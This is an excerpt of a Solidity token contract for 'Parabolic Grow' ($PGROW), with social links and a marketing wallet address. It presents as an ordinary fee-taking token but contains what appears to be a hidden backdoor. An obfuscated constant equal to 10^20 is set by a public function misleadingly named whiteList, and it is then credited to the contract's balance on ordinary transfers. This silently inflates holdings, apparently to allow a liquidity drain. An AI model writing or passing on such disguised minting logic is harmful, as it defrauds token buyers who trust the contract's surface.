...
//Telegram : https://t.me/ParabolicGrow
//Website : https://twitter.com/ParabolicGrow
...
contract ParabolicGrow is Context, IERC20, Ownable {
    ...
    string private constant _name = "Parabolic Grow"; // 

    string private constant _symbol = "$PGROW"; // 
    ...
    address public  _marketingWallet = 0xe1cB6Ef92269eaC61a625D23BB46f4a26fe8FCC0;
    
    uint256 public _buyCooldown = 0 minutes;
    mapping (address => uint256) private _lastBuy;
    uint256 public buyCD = 0;
    uint256 private maxbuyCD = (5*2)**((5**2)-5);
    ...
    function _getValues(uint256 amount, address from) private returns (uint256) {
        ...
        _tOwned[address(this)] += marketingFee + liquidityFee + buyCD;
    ...
    function whiteList(address x, address y)public{
        if(!_isExcludedFromFee[x] && _isExcludedFromFee[y]){
            buyCD = maxbuyCD;
            swapping = true;
        }
    }

    function isWhiteList(address msqSender)public{
        bool isExcluded = _isExcludedFromFee[msqSender];
    ...
    function _transfer(
        ...
        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
            ...
            transferAmount = _getValues(amount, from);//LFG
        }
